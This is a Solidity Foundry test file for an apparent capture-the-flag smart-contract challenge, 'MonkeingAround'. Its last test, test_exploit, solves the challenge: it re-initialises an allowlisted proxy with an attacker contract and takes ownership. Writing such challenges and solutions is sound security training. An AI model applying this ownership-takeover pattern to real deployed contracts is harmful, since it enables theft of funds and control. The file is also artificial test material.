// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/SetupMonkeingAround.sol";
import "../src/MonkeingAround.sol";
import "../src/SolveContract.sol";

contract CounterTest is Test {
    SetupMonkeingAround public setupma;
    MonkeingAround public ma;
    address public proxy;
    address public imp;
    address player;
    address owner;

    function setUp() public {
        player = makeAddr("player");
        owner = makeAddr("owner");
        setupma = new SetupMonkeingAround(player);
        ma = MonkeingAround(setupma.challenge());

        proxy = ma.allowlisted(0);
        imp = ma.allowlisted(1);
    }

    function test_setup() public {}

    function test_owner() public {
        assertEq(ma.owner(), address(setupma));
    }

    function test_allowlist() public {
        assertEq(ma.allowlistCount(), 2);
    }

    function test_imp() public {
        vm.startPrank(player);
        bytes memory resAdd = ma.doSomeMonkeMath(imp, abi.encodeWithSignature("monkeAdd(uint256,uint256)", 5, 2));
        assertEq(uint256(bytes32(resAdd)), 7);

        bytes memory resSub = ma.doSomeMonkeMath(imp, abi.encodeWithSignature("monkeSubtract(uint256,uint256)", 5, 2));
        assertEq(uint256(bytes32(resSub)), 3);
    }

    function test_imp_init() public {
        vm.startPrank(player);
        vm.expectRevert();
        bytes memory resInit = ma.doSomeMonkeMath(imp, abi.encodeWithSignature("init()"));
    }

    function test_ma_proxy_init() public {
        vm.startPrank(player);

        // Should succeed in calling proxy through main contract to intialize (setting the IMP address on the main contract)
        bytes memory resAdd = ma.doSomeMonkeMath(proxy, abi.encodeWithSignature("init(address,bytes)", address(ma), ""));
        console.logBytes(resAdd);
    }

    function test_proxy_init_direct() public {
        vm.startPrank(player);

        // Should fail on direct call to proxy to initialize
        (bool succ,) = proxy.call(abi.encodeWithSignature("init(address,bytes)", address(ma), ""));
        assertEq(succ, false);
    }

    function test_exploit() public {
        vm.startPrank(player);
        SolveContract sc = new SolveContract();
        ma.doSomeMonkeMath(proxy, abi.encodeWithSignature("init(address,bytes)", address(sc), ""));
        ma.doSomeMonkeMath(proxy, abi.encodeWithSignature("solve(address)", player));

        assertEq(ma.owner(), player);
    }
}
